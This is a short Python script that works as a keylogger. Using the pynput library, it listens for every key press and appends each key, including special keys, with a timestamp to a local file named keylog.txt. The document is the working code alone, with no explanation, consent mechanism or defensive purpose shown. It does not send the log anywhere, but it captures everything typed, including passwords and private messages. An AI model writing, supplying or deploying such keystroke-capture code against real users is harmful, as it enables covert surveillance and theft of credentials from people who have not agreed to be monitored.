from pynput.keyboard import Key, Listener
import logging

# Define the log file
log_file = "keylog.txt"

# Setup logging format
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to execute on each key press
def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special Key {key} pressed')

# Start the listener
with Listener(on_press=on_press) as listener:
    listener.join()
